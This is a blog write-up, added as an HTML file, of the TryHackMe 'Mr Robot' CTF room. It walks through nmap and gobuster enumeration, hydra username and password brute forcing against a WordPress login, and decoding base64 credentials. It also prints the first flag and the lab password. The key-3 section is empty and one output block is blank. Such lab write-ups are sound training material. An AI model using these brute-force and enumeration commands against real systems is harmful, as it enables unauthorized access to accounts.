@@ -1,0 +1,223 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Mr Robot CTF | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe Mr Robot CTF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthrough/Writeup of a TryHackMe room about directory enumeration, WordPress and reverse shells" />
+<meta property="og:description" content="Walkthrough/Writeup of a TryHackMe room about directory enumeration, WordPress and reverse shells" />
+<link rel="canonical" href="http://localhost:4000/tryhackme/Mr-Robot-CTF/" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/Mr-Robot-CTF/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Mr Robot CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthrough/Writeup of a TryHackMe room about directory enumeration, WordPress and reverse shells","headline":"TryHackMe Mr Robot CTF","url":"http://localhost:4000/tryhackme/Mr-Robot-CTF/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="mr-robot-ctf"><a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF</a><!-- omit in toc --></h1>
+
+<p>This room is inspired by the famous <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr Robot tv series</a>. It’s structured in a CTF way, so we’ll have to get three flags from the target machine.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#what-is-key-1">What is key 1?</a></li>
+  <li><a href="#what-is-key-2">What is key 2?</a></li>
+  <li><a href="#what-is-key-3">What is key 3?</a></li>
+</ul>
+
+<h2 id="what-is-key-1">What is key 1?</h2>
+
+<p>We are given a [target_IP]. First things first, we need to enumerate the services which are running on the machine:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap [target_IP]</code></p>
+
+<p>This will return the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre></div></div>
+
+<p>This means that a web server is running on the machine. Paste the [target_IP] inside your browser’s address bar, then explore the web application. Again, this is a Mr Robot inspired machine so look around for cool references to the series.</p>
+
+<p>Navigating this cool site id fun, but we need to look deeper into it. Let’s enumerate directories by using <a href="https://www.kali.org/tools/gobuster/">gobuster</a>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://[target_IP] -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></p>
+
+<p>In this command <code class="language-plaintext highlighter-rouge">-u</code> stands for the url and <code class="language-plaintext highlighter-rouge">-w</code> for the wordlist (in this case we’ll use a <a href="https://www.kali.org/tools/dirbuster/">dirbuster</a> wordlist).</p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/images               (Status: 301) [Size: 236] [--&gt; http://[target_IP]/images/]
+/video                (Status: 301) [Size: 235] [--&gt; http://[target_IP]/video/]
+/rss                  (Status: 301) [Size: 0] [--&gt; http://[target_IP]/feed/]
+/image                (Status: 301) [Size: 0] [--&gt; http://[target_IP]/image/]
+/blog                 (Status: 301) [Size: 234] [--&gt; http://[target_IP]/blog/]
+/0                    (Status: 301) [Size: 0] [--&gt; http://[target_IP]/0/]
+/audio                (Status: 301) [Size: 235] [--&gt; http://[target_IP]/audio/]
+/sitemap              (Status: 200) [Size: 0]
+/admin                (Status: 301) [Size: 235] [--&gt; http://[target_IP]/admin/]
+/feed                 (Status: 301) [Size: 0] [--&gt; http://[target_IP]/feed/]
+/robots               (Status: 200) [Size: 41]
+/dashboard            (Status: 302) [Size: 0] [--&gt; http://[target_IP]/wp-admin/]
+/login                (Status: 302) [Size: 0] [--&gt; http://[target_IP]/wp-login.php]
+/phpmyadmin           (Status: 403) [Size: 94]
+/intro                (Status: 200) [Size: 516314]
+/license              (Status: 200) [Size: 309]
+/wp-content           (Status: 301) [Size: 240] [--&gt; http://[target_IP]/wp-content/]
+/css                  (Status: 301) [Size: 233] [--&gt; http://[target_IP]/css/]
+/js                   (Status: 301) [Size: 232] [--&gt; http://[target_IP]/js/]
+/rss2                 (Status: 301) [Size: 0] [--&gt; http://[target_IP]/feed/]
+/atom                 (Status: 301) [Size: 0] [--&gt; http://[target_IP]/feed/atom/]
+/wp-admin             (Status: 301) [Size: 238] [--&gt; http://[target_IP]/wp-admin/]
+/readme               (Status: 200) [Size: 64]
+/xmlrpc               (Status: 405) [Size: 42]
+/page1                (Status: 301) [Size: 0] [--&gt; http://[target_IP]/]
+/0000                 (Status: 301) [Size: 0] [--&gt; http://[target_IP]/0000/]
+/wp-login             (Status: 200) [Size: 2671]
+</code></pre></div></div>
+
+<p>let’s try looking at the (Mr) <code class="language-plaintext highlighter-rouge">robots.txt</code> file. Paste <code class="language-plaintext highlighter-rouge">[target_IP]/robots.txt</code> in your browser’s address bar. It will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre></div></div>
+
+<p>This means that ther’s also a <code class="language-plaintext highlighter-rouge">key-1-of-3.txt</code> file, which turns out to be our first flag if we go to <code class="language-plaintext highlighter-rouge">[target_IP]/key-1-of-3.txt</code>:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">073403c8a58a1f80d943455fb30724b9</code></p>
+</blockquote>
+
+<h2 id="what-is-key-2">What is key 2?</h2>
+
+<p>Let’s keep looking at those directories we found earlier: <code class="language-plaintext highlighter-rouge">wp-login</code> is probably the login page to this <a href="https://wordpress.org/documentation/">WordPress</a> website. However, it looks like we need a username and a password for it:</p>
+
+<p><img src="/assets/images/thm/mr/login.png" alt="login" /></p>
+
+<p>We are going to look at the rest of the directories just in case we missed anything useful. Remember that <code class="language-plaintext highlighter-rouge">fsocity.dic</code> dictionary file? Let’s download it with <code class="language-plaintext highlighter-rouge">wget http://&lt;target-ip&gt;/fsocity.dic</code></p>
+
+<p>We can now use it to enumerate usernames (and possibly get a password) from the login form. We notice that trying to login with a random username will return the <code class="language-plaintext highlighter-rouge">ERROR: Invalid username. Lost your password?</code> error, so that means that we are actually able to enumerate usernames.</p>
+
+<p>Let’s get this POST request’s body with <a href="https://en.wikipedia.org/wiki/Burp_Suite">burp</a>. We’ll see:</p>
+
+<p><code class="language-plaintext highlighter-rouge">log=&lt;username&gt;&amp;pwd=&lt;password&gt;</code></p>
+
+<p>We’ll use <a href="https://www.kali.org/tools/hydra/"><code class="language-plaintext highlighter-rouge">hydra</code></a> to run a <a href="https://en.wikipedia.org/wiki/Dictionary_attack">dictionary attack</a> based on the <code class="language-plaintext highlighter-rouge">fsocity.dic</code> dictionary file.</p>
+
+<p>Username enumeration with hydra will look like this</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -L fsocity.dic -p test &lt;target-ip&gt; http-post-form "/wp-login:log=^USER^&amp;pwd=^PWD^:Invalid username"</code> (<code class="language-plaintext highlighter-rouge">-L</code> means that we are using a username list instead of a single username)</p>
+
+<p>this will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[80][http-post-form] host: 10.112.162.72   login: Elliot   password: test
+</code></pre></div></div>
+
+<p>This means that <code class="language-plaintext highlighter-rouge">Elliot</code> is the correct username. Logging in with that username and a random password will return the <code class="language-plaintext highlighter-rouge">ERROR: The password you entered for the username Elliot is incorrect. Lost your password?</code> error. Let’s guess the password with the same wordlist:</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -l Elliot -P fsocity.dic &lt;target-ip&gt; http-post-form "/wp-login:log=^USER^&amp;pwd=^PWD^:The password you entered for the username"</code> (<code class="language-plaintext highlighter-rouge">-P</code> means that we are using a password list instead of a single password). This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+
+<p>We stumble upon the <code class="language-plaintext highlighter-rouge">/license</code> directory. It displays a message:</p>
+
+<p><code class="language-plaintext highlighter-rouge">what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?</code></p>
+
+<p>But you can scroll down on the page and find this other string:</p>
+
+<p><code class="language-plaintext highlighter-rouge">do you want a password or something?</code></p>
+
+<p>Scrolling down even further:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ZWxsaW90OkVSMjgtMDY1Mgo=</code></p>
+
+<p>This might actually be a password, but to me this looks more like a <a href="https://en.wikipedia.org/wiki/Base64">base64</a> encoded string: base64, in fact, works by dividing the input string in blocks of 3 bytes; if the total number of chars that make up the input string is not a multiple of 3, you’ll se either 1 or 2 <code class="language-plaintext highlighter-rouge">=</code> chars.</p>
+
+<p>Let’s decode this string:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode</code></p>
+
+<p>This will return:</p>
+
+<p><code class="language-plaintext highlighter-rouge">elliot:ER28-0652</code></p>
+
+<p>Which is most probably the <code class="language-plaintext highlighter-rouge">/wp-login</code> username and password. Let’s try and use this:</p>
+
+<p><img src="/assets/images/thm/mr/elliot.png" alt="elliot" /></p>
+
+<p>We’re in!</p>
+
+<h2 id="what-is-key-3">What is key 3?</h2>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
